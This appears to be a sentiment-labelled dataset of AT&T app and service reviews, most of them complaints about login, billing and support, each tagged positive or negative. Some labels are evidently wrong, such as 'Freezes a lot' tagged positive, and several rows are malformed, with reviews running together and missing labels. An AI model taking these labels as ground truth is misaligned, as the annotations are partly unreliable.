"Terrible customer service, terrible service, period. The app makes you use two-part authentication. Problem is, the screen they send for you to send the password to you via text is a static jpeg. No hyperlink, no way to move forward. The number they give you ""in case there's a problem"" is their general customer service line, which uses that terrible automated ""Tell me the problem."" The problem is, it sent me to the wrong department where I was on hold for 15 minutes. Customer service refuses to go off script for any part of the conversation.",negative
Can’t seem to get the app to pull up my info.  After it finally does it works ok.,negative
very bad service,negative
Att Wireless is useless overseas. Run to any other provider immediately before leaving for vacation. All I am doing is trying to pay my bill. Spent a fortune ‘on hold’ and nobody answers. Downloaded this ap and it says it won’t take my username and password. (How many years have I been a customer logging in?) I can’t login through regular online web (really useless internationally). What year is it ATT? Oh - you are behind the competition. Or is it you just don’t like Spain? Hmmm....,negative
Freezes a lot,positive
"I called to pay my bill recording says they would send a link to pay my. When I tried to open link message read said Safari cannot open page because it could not load. Tried to pay on my att app. Said it was wrong password. The email that it shows for me  I no longer have. Tried to change email and password. When I put that it in it still won’t open. Trying to pay bill that is due on Monday. It needs to be simpler to pay your bill. I feel there should be a number to call 24 hours a day 7 days a week where you can just pay your bill. Not have to talk to a person and pay a fee. The number on bill doesn’t say office hours on a Sunday. If you get a recording it should works 7 days a week. I am so tired of having to call Att ever month about my bill because a it shows a charge that was suppose to be taken off months ago. I get credit the person says they will take the movie pkg off of my bill that I never ordered. But it doesn’t happen. Called again this month given a credit for the charge and told again they would remove that pkg. we will see what happens. If I could charge Att for the time I have to spend on the phone with you guys I would be rich. Then when you get s person and want to pay your bill they want to charge you that is a bunch of bs. Not a happy Att customer. I have been with Att for over 50 years and it is getting worse. People are nice when they talk with you always apologize for the problems you are having, but they don’t take of the problem like they say they will.",negative
"This is ongoing. Whenever I want to look at my plan, I get a bad request and it kicks me off the website. My account will not allow me to look at my DirectvNOW account.",negative
"I have spent 2hrs talking with att reps and they have no idea how to set up my e- mail. Just spent $804 on a new iPhone and I can’t get or send any e- mail. Now I’ll have to pay a qualified specialist over$100 set it up. 
Very disappointed in AT&T.",negative
"I have been an AT&T customer since 2008. I am not pleased with 1) how much I pay, 2) the lag in the app 3) the service and dropped calls. I stay loyal but AT&T does not.",negative
ATT recently upgraded my plan without my permission.,negative
Not happy you just increased my unlimited plan without notifying me. Seems like you penalized me because I have the grandfathered unlimited plan,negative
"At&t did same thing to me, put the  enternet in my name instead of my mom the bill was added to my wireless bill. When my died they sent $146 bill to collections.  Because I didn't pay it. It was Mom's bill.",negative
"The bait and switch...
My husband and I signed up with AT&T a few years ago with the 15gb plan for $100 a month (I believe was the price). In March of this year they changed our plan with no notice to the 30gb plan at a higher price. WITH NO NOTICE, I repeat!!!

How is that even legal?",negative
Why can’t my bill be the same price every month???? It changes EVERY MONTH but yet the service never changes.,negative
Absolute joke,negative
For being a att app it sure is slow as hell. I only use it to pay my bill but that part is usually fast as hell !!! Go figure.,negative
"My phone had to be reset. Now I have to install the AT&T app. Put my password in, sent me to another page and I select what phone to send a special code to verify it is me. That is as far as I can go because nothing else happens.  And when I finally received to code there wasn’t any place to put on the app. Sooooo I’m not too happy with this app.",negative
You went up on my bill with out notifying me,negative
AT&T is very well known for abusive overcharging their customers and ripping them off.,negative
I have to get in and out of the app to make progress. The response time is very slow and lags almost every time. Sometimes there is a message that things are taking longer than expected (whatever that means) and other times it just doesn’t respond.,negative
The service level has gone down ALOT in the last 6 months. I am dropping a ton of calls every day.  Need the boost the signal in our area.  I know a lot of folks that are changing carriers because of it....,negative
Cannot log into 1 of 2 accounts because ATT doesn’t know how to run their billing-as a shareholder I am appalled how badly they treat their customers yet they over pay their top execs huge salaries just so they can perpetuate bad practices. Will be dropping ALL their services because their DirectTV continually drops services.,negative
The worse I do not recommend this services to no one what so ever ????????????,negative
"I would LOVE to pay my bill via this app. I’ve never been able to log in twice ina row, eve with Face ID.

Amazingly poor",negative
Don’t get service with them!!!,negative
The worst service provider ever!,negative
I have been a faithful AT&T customer for years!  I feel like they are a great company and Loyalty matters to them!,positive
"I’m so disappointed in how money hungry this company has become, when my contract is up, I will be disconnecting my services! When we call in no one can speak good English! I’m very dissatisfied ?? I call and ask help to move one tv from one to another, the guy on the phone couldn’t help to say the least! Then had to send someone out, didn’t say there would be a charge, then what do you know! A 50.00 extra charge! I’m very unhappy! I own a business, this Not Good Customer service!!!!",negative
It takes years to load any information,negative
"I have been having increasing troubles with the app. Takes forever to load and today I changed my password, now the sign in screen takes me to a verification screen which is frozen! The service has been getting worse over the past year... the only reason we stay is because we live in the country with no other cell options",negative
Trash app.  Was working fine before.  Please fix ASAP   I can’t even log on thru the web smh,negative
Impossible to use. Slow or no response. Absolutely unacceptable for the rates.,negative
Absolute junk,negative
"This app make paying bill & other services very  convenient. My only issue, I liked the last app design before recent update. It was easier to navigate through app. This design is not as user friendly.",positive
You can’t switch between AT&T and Direct TV Bill,negative
"Just spent half an hour trying to log in to pay my bill, random access blocking to verify who is paying, and the process is long, I paid three other bills old-fashioned way by writing checks and filling envelopes faster than it took to pay this bill on the app.
If it ever does this again, i’ll just wait till my bill is late, wait for my text message (oops, life happens) and pay with a touch of one button. What a headache.",negative
"I’m continuously given different info about my bill. Because of your billing cycle none of the info your representative was accurate. I’ve been sold on “promotions” when in fact they were adjustments to my bill. I was told to use paperless billing to reduce my bill, in fact it went up due to the end of a “promotion” after being told I will be contacted when this promotion ended. And I was’t. So at the time I opted for paperless billing, my bill was more than what I used to pay!  It’s very hard to keep track of our payments and offers of promotions we bought into, with paperless billing. Today after talking to one of your representatives, I was told going back to paper billing WILL NOT increase our monthly bill.",negative
"App Always crashes 
Never picks up phone 
Long wait times
Only thing that works is payment processing,
No customer satisfaction 
Even spelled my name wrong for my account 
Getting att mail for someone named Marcos. Not my name",negative
You guys have the worst speed Internet and soon as you get on the game it freezes and lag it’s horrible service and you pay so much for really bad Wi-Fi I don’t get you guys Xfinity is better than AT&T and y’all need to fix your Wi-Fi because it’s terrible I hate your Wi-Fi I hate your service and I hate AT&T here we go again you guys have the worst Wi-Fi in the world your Wi-Fi so bad the download speed for the Wi-Fi is terrible you guys are the worst company to ever exist I pay so much for the worst Wi-Fi??????????,negative
Horrible service.  Misleading customers is not right !,negative
"Ridiculously cumbersome to change programming. Every time I tried to manage my account, the app froze up an gave me the eternal spinning wheel.",negative
This app is terrible. I used to have all the info about my account on the homepage. Now it takes me forever to try to access my phone bill. This app looks more like a status website page. It shouldn’t be trying to sell me stuff it should let me access my account info right away!,negative
"CONSTANTLY having to call every single month because every month when I check my app my bill is outrageously high. And every month I am PROMISED it will never happen again, but still every month it’s the same! I’m FED UP!! Been with AT&T since they were Cellular One, but I’m seriously thinking about switching providers. This is ridiculous!!!",negative
I’m really fed up with you people it tells me to reset my password and then it tells me it does it meet your requirements. Where in the heck are they? It’s stupid to assume everyone knows what your requirements are,negative
"ATT sold us on their cell phone package and sung the praises on their app and how we could control data usage by the kids with it. That all fine and good when the app feels
like working which is less than 50% of the time. This app is crap. Uninstalled, reinstalled, checked for updates. It still runs terrible. Shame on ATT for their lack of effort here.",negative
"At this moment, my app is completely USELESS!! I tried using it after getting a brand new iPhone XS Max and after entering my credentials, I get taken to another screen that attempts to send me a code to “make sure it’s me”. Well, great, except that none of the buttons on the screen work so I can’t get a code sent. It might as well be a pic. So, I try Safari. Same thing!! Finally, I try Firefox. Ok, it works. I go back to my app. SAME thing!! I deleted the app and re-downloaded. SAME THING!! Fix it AT&T and I’ll consider updating my review. Until then...ONE STAR!",negative
"The app doesn’t really do anything. It shows how much my bill is, but when I click the button to see my bill, the button briefly flashes, but there’s no bill to see. It shows data usage, which is not particularly interesting since we have an unlimited data plan. 
There’s no way to manage your account or devices; you have to go to the website to do that. 
Also, my bill is not current. On the website, I see my current bill. The app is currently showing me last months bill. I assume that the app will catch up in a day or two. 
An app should be able to do pretty much everything that the website can can do, but this app falls far short of that. 
Disappointing, but I guess it’s “just okay”.",negative
"Had been paying my bill online for several months. For the past 3 months I have been unable to log into my online account. Despite spending 2 hours on the phone last month and almost 2 hours this month, despite getting a new user ID and probably 12 temp passwords to try to reset a permanent one my issue has not been resolved. You only saving grace is your representatives are nice and try their best to be helpful or my phone service would be elsewhere. Whatever changes you made to your system it now is terrible",negative
Thanks for the opportunity and service. AT&T customer support is very helpful. Thanks for the great internet. Streaming is great but gotta be careful “limited”. Discounts are great. Looking forward to stay with AT&T in the future. Thanks for understanding.,positive
The user interface is so confusing and the app is buggy.,negative
"For several weeks I was unable to access online billing information because the 2FA didn’t work to my phone, even though it had previously. I eventually sent it to my wife’s phone. Mind you I did not have the ability to re-route verification to email like many other challenge features. Been an ATT mobile user for 10+ years. This was disappointing. 

Yes, much of the rest of the app is fine. But this poor design flaw seems puzzling given the importance of making password resets both easy and strong.",negative
"Calling customer service and having to deal with an automated system is very annoying. Then when you finally talk to someone they are almost always foreign and hard to understand. 
Also have had an ongoing issue with TVs going out that 3 service calls have not been able to fix.",negative
Very mean and rude. Over charge me and will not let me stretch my payments out online to meet my payday. I always have to call and I’m working. Smh,negative
I need to print a couple of pages for my expense report which it doesn’t allow sobered have to use my laptop in the future which is less convenient,negative
Our internet service is shorty at best . Everytime we try to connect it sends a message that we are not connected. Or if by chance we do connect 2 minutes later it disconnects. You call you get put on hold. I don’t have time to set on hold for 1.5 hours.,negative
Every time I look at my next bill it creeps up just a few cents more!   Always increasing the fees!  I have begun to look for other carriers that has reasonable pricing and still offer my company discount. Seems my company discount is what is increasing my fees...making up for the upfront discount?,negative
I’m not sure why you took off Channel 8 I’m hoping that you guys will put it back on soon I do not want to have to change TV providers,negative
I hate this website.  Do you want me to pay my phone bill?  FIX THIS WEBSITE!  Worst website ever.,negative
We have been customer for years. New sigh ups get lower rates and ours has gone up $129.00 a month. Guess we need to change providers since loyal customers get Huge rate increases. Have always liked att but can’t even get some of our favorites shows due to stations being cut. Will have to decide what we will do in a couple of week. Infinity might be your replacement.,negative
Please make this deal or lower my rate ASAP!!!!!,negative
"I feel bad for the customer service people, the company does not set them up for success",negative
The app never works for me. Always forces closes after I sign in,negative
"First because of their poor communication with customers, now days we have many ways to get in touch with so...not excuses... 
I tried to update my internet speed on their webpage, I was on internet 25 and I wanted internet 50 and I did... it was so easy... then I got a confirmation number and they said I will receive an email with more information about my order and I did. I got the email saying that the order was getting started, couple of minutes latter received a second email saying... great news your order has been processed a summary of the services you ordered is showing below.... and below was showing the details of my order internet data allowance etc...and “the activation date of July 6” that was the day that I made the update. 
Today July 13, 2019 still waiting for my internet update, I called and they said that they need to come and change my equipment and the next available date is July 19...WHAT??  No emails, no phone call nothing to let me know about this. But my bill is all set and ready for me to pay “my internet 50” that is not installed and I’m not using. Really AT&T??",negative
Never works.  Worthless,negative

Very poor customer service and extremely high rates for subpar service.,negative
"We’ve had AT&T DirectNow television for a few months now. At first it was fine but in the last few weeks the loading speeds are bad. In the middle of movies and tv shows it will try to load and say “sorry for the inconvenience, thank you for your patience.”  Patience is wearing thin!",negative
Can’t find any info,negative
So many glitches all the time.,negative
This happens very often,negative
"This app repeatedly asks me to re-enter my password.  When I enter the password, it recycles back to the sign in page and says ""please enter your password. Either your password has changed or you haven't signed in for a while."" So after about 5 times, it may let me into the account.  If I am fortunate enough to actually get into account, the app constantly kicks me out.",negative

Very mediocre.",negative

"My husband and I were on the search for a new provider. We had heard good things about the att coverage so we chose to go there. They had a great deal of buy one get one for the iPhone XR. I was super excited. We stated talking pricing and plans with the rep. We got the unlimited and more plan. So the bill should have been $70 for the plan, $25 for the buy one phone, and $22 total for the insurances. We got our first bill of $306.
 During the process of signing up and getting the phones, my husband and I asked many many times over if there were any other fees; the rep continued to tell us no. We also asked many times over if our regular bill should be about $120, she consistently said yes. We have no just come back from a different att store and were told by them and customer service that there is an additional $70 a month access fee. We asked so many times in store about any fees and were lied to. 
Now we are at the point that we are going to return our phones and request a full refund, and because we paid with a debit card I am sure that it will be 7-10 business days before we see that money; meaning we will be out phones for that length of time. 
I am very disappointed and dissatisfied with att.
We understand prorated charges because we started in the middle of a billing cycle, but paying $70 more a month because we were lied to, I just can’t see it!",negative
The old app was way much easier to find contact info etc.  this one everytime I try to find something I have to click in at least 3 different places and still have a hard time finding.  Customer service call number for mobile is impossible to find!,negative
"The widget stopped updating 2 weeks ago. The new update to make it quicker to get to usage has added a step instead. Not sure what the developers are doing, but it is making the app worse.  Widget setting page only shows my account number and no actual settings.  About to uninstall the app as it still does not work. Tried to reinstall and now all usage data is gone. So long I will not miss you. Later mtAT&T.",negative
Worst customer service ever,negative
This app is by far the worst. It always freezes and has to be reloaded multiple times. You would think AT&T could make an app that works. It’s trash’s,negative
"I get this message, AT&T Msg: Your DIRECTV repair is scheduled for 07/12 btwn 8AM-NOON. Go to DIRECTV.com/myappt for status or to reschedule. Text STOP to opt out. Won’t take me to this.

"The service is really slow hardly get any bars anywhere I go  , every time I call you guys just wanna screw me over , we argue and fight , really bad service",negative
Page does not load past the sign on screen.,negative
Too expensive,negative
I would rate it higher if I were able to use it at home. I had ATT show me coverage maps before starting service and committed to a 2 year contract. Then they had a tower in such disrepair I’m having no service most of the time unless I’m in a bigger city. No one is more kisses when they see a okay isn’t ok commercial than me because they still won’t let me out without paying a ton of money to do see when they breached the contract because they really aren’t getting me the service they said they would!,negative
I love the service but there prices are “Ridiculous “......Gotta have two jobs in order to have AT&T,negative
My neighbors still my internet and us up data ... then I get a letter from ATT stating you have used up most of your data and ATT want help me fix the problem with internet thief’s....   Should be a way to block them.,negative
"My AT&T used to display all the information I needed- after a recent update it doesn’t show anything. 

Can’t find data usage, device information, there is nothing on the new version. No useful information. 

New update needs to be rolled back!",negative
This is the worst. Every month I go to the app to pay my bill and it asks me to verify my identity. I am unable unless I touch forgot password which I haven’t so I have to waist my time calling a associate to pay my bill on the phone. Every month. Ridiculous. Fix your app!,negative
Why is it when you try to find something you are asked for your AT&T phone number and you don’t have one you are out of luck. Why is it I can get AT&T for Direct TV on my cell phone but not my computer??  Do you have to have a separate password??  I have to say since AT&T bought Direct TV i have had nothing but trouble finding a telephone operator that knows anything about Direct TV.  I love Direct TV but given the chance to go to Dish.,negative
Ridiculous how I had to reset my password. Stated I had not logged on for a while. I have Face ID enabled and that did not work!,negative
For the last few of months I have been unable to view my data usage or call AT&T from the IPhone App since the last update. I have also been unable to pay my bill from the App. I am very disappointed with it.,negative
On hold multiple times and too many departments to resolve issues. Seems like the AT&T way of exhausting the customer so they eventually give up and hang up the phone and do not pursue and rectify the issue. “It’s not my job mentality”,negative
At t does nor listen when you are speaking to them and they screwed up mty account so badly not sure if it will ever be correct. Say they will call back and NEVER DO! I would like to speak to CEO and tell him what knuckleheads he has working for him. I can do the job that they are suppose to be doing . I have explained over and over again.,negative
Never lets me into account. Just keeps looping from log in page. Deserves a zero.,negative
Very convenient!,positive
Easy to navigate!,positive
I love this app. I can do everything I need to do on line. It saves me a lot of time. I can pay my bill or make changes to my account from anywhere.,positive
Always struggling with week signal. All devises are new but phones are usually 2 bars and when I travel in Arizona it gets worse. Will be switching when current contract is up!  Maybe sooner!?,negative
It runs really slowly??,negative
They still haven’t fix my account bill. Please have a manager call me to resolve my issue.,negative
Your update has made the app useless for my family. We have spent 3 hours on the phone with different representatives only to be told it must be your browser. So no online account information and no online tv,negative
I have not had quality service or my needs met either by a phone agent or an installer,negative
Said my bill was past due,negative
Worst company I have ever had to deal with. They have tried to raise by bill every 2 months by $50 adding programs that I have never agreed to!,negative
Very easy to set up and make payments however you like to do so.,positive
"Easy as heck,  an just seconds needed to process payments. Old school , in a lot of ways myself. But loving this app stuff.",positive
"I like the application when it works. Unfortunately, every time I sign on it doesn’t recognize my password and I have to request a pin and change the current password.",negative
You website is too confusing to a customer who is trying to pay their bill. The site is set up to make you pay the full amount when you only want to pay a portion of the payment,negative
When I pressed to upgrade my phone on the app I saw the phones of SOMEONE ELSE'S account listed with names and phone numbers. You guys should look at this ASAP.,negative
The app keeps asking you to sign in and sends you a new passcode. It’s useless...,negative
"The app works for AT&T, not customers. It is easy to buy more and spend more it is very difficult to find answers, get help or resolve issues. I never use the app to get help. I call sales and get a response from a human quickly. Crazy system.",negative
"The store manager Greg provided great customer service, and was very knowledge about what I was looking for. Highly recommend going to this store!",positive
This is the absolute worst app I have ever had hands down. Logging in is impossible. It makes me want to go to a different carrier.,negative
I have great prices great phone!!,positive
"Really
Like this service except if something goes wrong help",positive
AT&T provides no way to track your international data usage.  You get 1gb data for the month but there is no way to track how much you have used.  You just get a text telling you have exceeded and are being charged $50 for another 1gb.,negative
"I was told different amounts, billing cycles, had to pay $125.00 for two months. Was supposed to be for one month. This really messed up financial for this month. Not very happy ??",negative

"My login preference has always been fingerprint. No issues. Multiple times I’ve had to change my password and although the password is good, it won’t let me use it. All I want to do is pay my bill. I guess I’ll be going to the store to take care of it.",negative
"I USED to like this app, it WAS convenient for making payments. However, it no longer works. I put in my password and nothing. I have to go on safari to sign in and it’s very annoying that the glitch has not been fixed.",negative
Thanks for the opportunity and service. Most of the service from AT&T is good. Customer service polite and understanding. Please install filters to stop robotcalls. Internet is great but limited when streaming. Thanks. I forgive you AT&T,positive
"I like the app, but it’s not always easy to find what your looking for.  I have to sometimes hunt to find where it’s at.  Would be so easy if things were in a list and you could just click on that link instead of finding it within other topics.",positive

"This app didn’t work for a couple of weeks without any explanation. I was charged a fee after going over on my data plan. This was after I tried to change plans on the app, and calling in.

"Security should be your first mission. Allowing spammers to manipulate us is a big fail for a big telecom corporation like AT&T. Isn’t enough we pay bills on time. Your security apps doesn’t help at all. No automatic blocking of spam calls. Instead of providing clean and clear service AT&T became like antivirus softwares. Big money goes to those spammers who live in globally and make fun of the most important loyal people “US”. AT&T could build and hire talented people to catch and destroy all these stupid fake spamming call softwares easy. Wake up AT&T god is watching you. Show some respect to people who believe in you. Catch the IP address and forward these calls to hell.

Stop making so many updates. It confuses clients. Every time you make an update I have to sign in all over again. The app is slower and it frustrates clients.,negative
AT&T is a customer service disaster.  Zero commitment to their customers...getting worse every year.,negative
"AT&T is terrible 
Why does my bill continue to go up and the service continues to get worse?",negative
Great and Easy,positive
I have both att and directv. Login is bootlooped so I can’t get into either service to pay the bill. Worked fine last month.,negative
This app look# like it will do a lot but half the links don’t work.,negative
AT&T has started to tell lies about these programs. My bill jumped up from 78 to 100. Wow. It is a money thing,negative
It used to be somewhere between good and great. And now is rivaling the cable companies for worst ever. Who knew it would take hours and hours to upgrade an iPhone without them adding an unneeded number to an account and not being able to fix despite hours of calls and in store visits. If they spent half as much time fixing problems as transferring calls between departments then they might not be as awful to deal with.,negative
Nothing else to add,negative
"When I opened the app, it was logged out automatically. Therefore, I tried to login in, but it said my account is not exist. However,  I kept pay bills through that account. Now I am staying in foreign country for trip, but there’s no way to pay bill.",negative
Excelente,positive
"Two factor authentication is broken. It will not allow me to click the button to send the code so now I can’t even log onto the app. Get it together, very unprofessional.",negative
Once you become a “loyal” customer they do not care about you.  They will raise your bill each year until it is no longer affordable.  You can leave them and come back for the new customer deals.  (I have been told that by AT&T). They should take care of the customers they have instead of encouraging you to leave.  I’m doing just that leaving and will not come back.,negative
I constantly have to restart the app. It’s limited as well,negative
Very user “unfriendly”. Always getting locked out.  Can’t retrieve copies of bills.,negative
Every single time i attempt to log in my password is never recognized. I always either have to reset my password or lock my account to go through a long and annoying process to be verified again just to log in.,negative
The website said something isn’t working right now and as I’m frustrated and having to check back later it signed me up for review. Here is your 1 star.,negative
I purchased a new iPhone on buy on get one and I have call each month to get the charges reversed... what a waste of time in both of our parts,negative

After waiting on hold for an hour I was told that my current bill would be 78$ and now I see that it’s STILL $118. AT&T keeps trying to take more money then agreed each month and I’m tired of it. I want what was promised,negative
"System is redundant. I can only see so much of my work order, and any customer service rep can add or edit my work order. This is very inefficient, especially when you have issues that no tech can figure out without calling you back or putting you on hold, or when calls take 40 minutes with no results. When my family first joined you guys, it took a little over a month to get a tech out, and about 11 or more 40 minute calls to seek out a work order error placed by and overlooked by multiple reps.(Don’t believe me, check my file, if records are properly kept, it’s very extensive.) I’ve been with att for months, you guys drop the ball, like a lot.  I recently moved and had tv and internet scheduled to be installed, I even bought phones for the family with att. Upon completion of my installation, MY INTERNET IS NOWHERE TO BE FOUND ON MY ACCOUNT, WE HAD SERVICE FOR APPROXIMATELY 30DAYS AND IT CUT OFF.  After spending too much time on the phone w reps, nobody can find any information on the internet, and it’s noted it was canceled the day it was installed. No record of why, no record of anyone cutting service from the pole.  So now I have a modem fully hooked up and operational sitting in my room, as I wait for a new modem and tech 5 days from reaching out to att.  The modem is coming with self installation instructions, which only proves my point that it shouldn’t have taken several calls and 5 days to find a solution to the issue. To be around as long as you guys have you tend to drop the ball, like a lot, and the only form of reciprocation You offer is a $20 discount?! Snack money for my bill?!  Is that really all you have to offer your customers when you tank and leave families without the services you’ve agreed to offer, due to negligence from att’s end?  I’m a small business owner and I do better than that. How about re-assessing the customer service department. If President Trump had this experience he would say that “It’s bad. Like really really bad”.  One last note, for the customer service reps, you should keep them current with policies and procedures and educate them in a more uniformed manner. I will get several different explanations or suggestions while seeking support from multiple reps. When I feel that they can’t help me, I’ve learned that life is easier if you ask for a manager or a escalation specialist. I don’t know what the punishment is for the rep forwarding a call upwards, but a lot of times they really push back too hard, which in turn leaves your customer spending the same 40 minutes they did with the last rep, giving the same information and having the same conversation, with minimum to no results. I shouldn’t have had to put in a work week for two issues that could have been resolved if a little more attention was paid. (I’m sure I’ve spent at least 15 hours on the phone, trying to troubleshoot my issues. Don’t believe me? Please get a calculator and look at my file.) It’s not about the money, but if you think this kind of behavior can be redeemed with $20 I’m sorry gifts, it won’t hold well for you guys long term, I promise. 

Thanks I guess

"My phone took many attempts to work while I was traveling in UK
I signed up for the $10 a day 

I was there only 5 days and ...  I did not use the phone successfully all 5 days - Even so the most I should’ve been charged Should be $50 or less for the five days but instead I was sent an outrageously high bill

No I have to go through the process of writing calling emailing etc to set the matter  straight 

To whom should I complain in order to get this resolved with one click",negative
I was a little skeptical to use apps for bill payments until I came across my AT&T app. This particular app is very easy to use and navigate through. It was also convenient to pay my bill with the app instead of going to my nearest AT&T store to make a payment.,positive
This app is the worst I’ve ever tried to use. Supposedly I can manage both my At&T cell phone bill and my DIRECTV on the same app. NOT!  I get my DTV info but can’t see or get into my phone info at all. Extremely frustrating and inadequate app!!!! If I’d known AT&T came with all this BS I would’ve stayed with my old company. At least their app was user friendly. Ridiculous!!!! ??,negative
"This has got to be the worst provider, I can hardly wait to get my service going again so I can cancel everything",negative
Nothing better than calling customer service where they refer you to an app that is a joke to log onto and a nightmare when you need it to work. The app is full of bugs and doesn’t seem to connect or update. It is not just my phone I am sure I can make a FB group on how horrible this app is and I would have a healthy group of frustrated members over this not so simple app.,negative
Your bills and app are confusing as hell.  I think ATT does this on purpose it’s that bad.,negative
"The app is slow, buggy, and not user friendly.",negative
Es cómodo y fácil de navegar y hacer actividades como pagos cambios,positive
Given the business you are in - the app should be state of the art.    Constant problems.  Always changing format ( not always for the better). Can’t get usage for over a week but was told it would be fixed in a day..............etc etc etc,negative
"I was conned into switching from T-mobile to AT&T by specialist John Aquino whose role is to prevent any billing issues for new customers.  Not only did I start receiving bills two or three times the price I was quoted, but also never received a satisfactory response when we reached out to the same guy for help in understanding what happened.  When I called customer service, they basically told me I was lied to & he pretty much couldn’t do anything for me except give me a $25 credit.  Now I’m locked in for two years paying a bill that is outside my budget, with a company that has a crappy app & even crappier customer service.  I’m so disgusted with myself for leaving T-mobile.  I never had any of these issues with them over the many years I used their service.  Do yourself & stay away from AT&T & don’t believe anything they say.",negative

I was on hold for 23 minutes before someone picked up.  The rep did not understand the issue and rendered incorrect advice on the U Verse APP.  I still do not know why some show are available for veiwing on the app while others are not. Know one at AT&T has been able to answer that question.   I was “mysteriously disconnected” and the rep never called back even though he asked for my number in case that happened.  POOR customer service.  I should have stayed with Xfinity.,negative

I once was able to monitor my kids usage & numbers that were called but now AT&T doesn’t show all usage and numbers I think that’s a very big negative for a national corporation especially when we pay a greater amount for the service when there are other services that are jus as good as AT&T.,negative

I don’t understand why my phone isn’t working most places I frequent. I spend almost a hour on the phone each time I get call to get help.

I have excellent credit and the first rep said I was approved for one line and the second would be $600 deposit! I told her something was wrong! Long story short I called back and got approved for five lines with only paying the taxes on the phone.

Hard to deal with when you have multiple accounts each one is set up with different email addresses you’ll never use. Att is piss poor when it comes to setting up multiple accounts. Might as well have different providers for each one so you can have the same email and password. Also if you say you’ll cancel att or dish they will call you in 3 days or less cutting your bill in half,negative
Customer service really could not show or understand anything from my app when I too needed help understanding. I spoke with a manager who then transferred me as well. Took me 5 reps before issue was handled.,negative

"I have been with Att for a long time and can not stand a lie. The sales person and two customer service reps all lied about your product.

Never came.  Called a few times after and got the run around.  Now they are saying they can’t do anything about it.  Pure trash if you ask me.

Not good!  But no one was there but the automated responses.  The automated response was wrong too...it says to click on the usage for more details on my bill...but you can’t do that either....no hot link on the bill

4.  Tried to update my address and got a message that a temporary system error was preventing the update so I have to call

Not confidence inspiring folks!",negative
In my book you don’t deserve stars for the service I get. My direct cuts out all the time an now you take my local channels off an I still have to pay the price I’m paying NO THANK YOU I’m moving on to something better,negative
The website hardly ever works. Half the time I can’t pull up my account. It is VERY frustrating!!!,negative
"I’m very unhappy that as a UVerse customer I’ve been without a major channel, CBS, for almost a week.  This is unacceptable.  You need to quit blaming Nexstar and work this out.  You are my provider and I expect a major channel like CBS to be provided.",negative
"The double check verification screen does not work correctly and I am unable to tap on ‘Send code’ button because blue and gray both show up along with ‘Cancel’ and none will allow tap.
Cannot login so cannot pay bill.
Frustrating !!!",negative
"No buttons are working. Can’t pay my bill, can’t look at my bill, can’t see anything. Fix your app.",negative
"Awkward phrasing, no date orientation on bills, indecipherable messages.",negative
So this keeps happening to me when trying to use this app. The app wants me to use my password since I haven’t signed in awhile but there is no field or place to enter my password. The only option is for me to use the forgot my password option. Then I have to do the change my password drill. The digital tools have got to improve.,negative
How many times do I need to go to the att store to get account and app to work maybe 4th times a charm. it’s stuck in an endless loop of verification and says we’re almost there. Not likely. Time to find a new service provider,negative
Cannot see billing statement on app,negative
"Chatbots are often ineffective when I've needed assistance but great at wasting time. Never attempt an upgrade on the app...it prompts you to pay upgrade fees and then At&t then charges you again for them scolding you that ""well you're not supposed to pay on the app!"" well pardon me do you have any fancy mustard to go with your sh*t attitude?",negative
My app keeps freezing and saying that it’s “updating.” Ugh,negative
This is useless. We can’t finish registration because it says it is upgrading the systems for 4 days???  Then it says our internet is offline. But I’m on the Internet posting this. The tech came out and tested the signal and we are good.  This is the most frustrating process.  I regret getting AT&T now. I want to cancel my service. Can someone just cancel it for me?,negative
Why is my bill almost $5 more all of a sudden,negative
"Spent 30 minutes to get to the correct page for Bill Payment 

Unsatisfied customer",negative
It does nothing.,negative
For the last 3 months it has taken me 30 to 40 minutes to pay my bill through my Att phone app. It does not recognize facil I’d even though it ask for it. Last month I spoke to a rep and thought he worked everything out but apparently not. I have been an Att customer for several years. I love the phone service and like to pay my bill on the app but if this continues I will have to switch back to paper statements. Please FIX it.,negative
"Sign in screenshot to send code to a device freezes up. I have deleted and reinstalled numerous time no luck. Please fix so I can view my bill. There are so many comments about this problem I don’t know how this app can be a 4 star, something wrong there!",negative
Irma Ramos was really helpful and friendly!,positive
"After multiple calls, I am rescheduled for the fifth time to receive Direct tv tomorrow, July 9. My internet and phone service were transferred to my new address after rescheduling four times.",negative
I am tired of the expensive cost of directv.  I have been a loyal customer for years and now we have to pay the price of no local channels because you guys want more money.  You have broken the contract that I signed up for.,negative
I hate that I have terrible service at my home,negative
Non responsive if not in super quantum fast WiFi connection. This APP is as slow and most of the features in the APP don’t work.,negative
The buttons aren’t working to see my bill but guess what does work. The button to this survey. Thumbs down.,negative
"I’m really not happy that I no longer have abc, and am probably going to cancel my service if this is not resolved soon",negative
I am trying to look at my wireless account and all I am able to access is DirectTV! Please fix this mess! I rarely need to look at DirectTV.,negative
"Can’t pay bill, go to support, troubleshoot, or anything w this update",negative
Trying to access my account several times and the app freezes to often,negative
"I had a simple question that would only take a minute to answer. I was told to wait, ok. After 30 minutes, I had to give up. Technology is only as good as the weakest link. Unsupported tech support has no value.",negative
I understand the need for security but you had my enter my password even though Im using fingerprint authentication then I had to have a passcode sent to my phone. Like really!!!! I just want to log in and pay my bill. I’m not applying to be president.,negative
I am able to see my account but unable to make a payment ??,negative
"It is confoundingly difficult to simply sign on and pay my bill. Every month I go through the excruciating exercise is trying to simply sign on!! Come on, you are the worlds leading telecommunications company. Could you PLEASE do something to stop the madness of multiple “cprod...” attempts and failures",negative
"I keep getting logged out of the app and when I try to log back in, it says my account has been locked and that I have to change my password. This app use to be easy and I would check it every few days so I could see my data usage for the billing cycle. Once this logging out / changing password issue came up, I have almost ran over on my data because I haven’t been checking it as much. And lets be honest, who wants to have to change their password every time they get on the app. Having to get confirmation emails about a password change and all that is a hassle. I’ve had to change my password 3 times in the last month.   
And to add to things.... when I try to submit this review, it says every nickname has already been taken...and I’ve tried some weird ones.",negative
Quit changing the app. I cant print a copy of my pdf billing now. I am required by my employer to have a copy for my reimbursement.  You are not making it easier. You are screwing it up.,negative
App wants you to believe how much they value your business.  Try asking them for something out of the norm & you will see they are like all the other carriers.,negative
"Since the day I have subscribed to AT&T services, not a single month gone by when I have either the billing issue or false promises made. 

It’s frustrating to spend hours and hours every month to resolve these problems. Yet again I see discrepancies in the bill.",negative
